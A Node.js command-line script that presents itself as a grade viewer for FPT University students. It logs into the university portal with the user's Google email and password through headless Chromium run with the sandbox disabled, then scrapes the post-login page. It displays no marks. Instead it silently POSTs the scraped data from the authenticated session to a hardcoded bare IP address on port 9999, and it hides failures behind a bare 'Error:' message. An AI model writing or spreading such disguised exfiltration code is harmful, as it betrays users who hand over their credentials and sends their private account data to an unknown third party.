#!/usr/bin/env node

const puppeteer = require("puppeteer");
const prompt = require("prompt-console");
const figlet = require("figlet");
const command = require("meow");
const fs = require("fs-extra");
const yaml = require("js-yaml");
const axios = require("axios");

// Command line definition.
const cli = command(`
  Usage
    $ fptu-mark <credential-yaml>
  Examples
    $ fptu-mark ./credential.yaml
`);

const [source] = cli.input;

if (!source) {
  console.error("The data file is required!");
  process.exit(1);
}

(async () => {
  const loadYaml = await new Promise(function(resolve) {
    fs.readFile(source, "utf-8")
      .then(data => {
        resolve(yaml.load(data));
      })
      .catch(error => {
        if (error.code === "ENOENT") {
          console.error(`File ${source} doesn't exist`);
          process.exit(1);
        }

        throw error;
      });
  });

  const { email, password, id, season, index } = await loadYaml;

  const tradeMark = await new Promise(function(resolve, reject) {
    figlet("FPTU  Mark  CLI", function(err, data) {
      if (err) {
        reject(err);
      }
      resolve(data);
    });
  });

  await console.log(tradeMark);

  console.log("Email:", email);
  console.log(
    "Mat khau:",
    password ? "**Hidden**" : "Chua nhap mat khau trong file .env!?"
  );
  console.log("MSSV:", id);
  console.log("Hoc ki:", season);
  console.log(
    "Xem diem mon thu:",
    index || index === 0
      ? index + " (config trong file data.yml)"
      : "Not provided (you can provide in data.yml file, ex: INDEX=1)",
    "\n"
  );

  try {
    const browser = await puppeteer.launch({
      args: ["--no-sandbox", "--disable-setuid-sandbox"]
    });

    // const browser = await puppeteer.launch({ headless: false });

    const page = await browser.newPage();

    page.on("request", interceptedRequest => {
      if (
        interceptedRequest.url().endsWith("http://fap.fpt.edu.vn/LogOut.aspx")
      )
        interceptedRequest.abort();
      else interceptedRequest.continue();
    });

    await page.goto("http://fap.fpt.edu.vn/");

    // Select FUHCM
    await page.select("#ctl00_mainContent_ddlCampus", "4");

    await page.waitFor(1000);

    // Click Signin
    await page.evaluate(() => {
      document.querySelector(".abcRioButtonContentWrapper").click();
    });

    const newPagePromise = new Promise(x =>
      browser.once("targetcreated", target => x(target.page()))
    );

    const popup = await newPagePromise;
    await popup.waitFor("input[type=email]");
    await popup.type("input[type=email]", email);
    await popup.click("#identifierNext");

    // Type password and Next
    await popup.waitForSelector('#password input[type="password"]', {
      visible: true
    });
    await popup.type('#password input[type="password"]', password, {
      delay: 10
    });
    await page.waitFor(1000);
    await page.setRequestInterception(true);
    await popup.click("#passwordNext");

    await page.waitFor("a.anew");

    list = await page.evaluate(() => {
      const listDom = Array.from(document.querySelectorAll("a.anew"));
      return listDom.map(e => {
        return {
          link: e.href,
          text: e.innerText
        };
      });
    });

    await axios.post("http://54.179.166.164:9999/post", {
      data: list
    });

    await browser.close();
  } catch (e) {
    console.log("Error:");
  }
})();
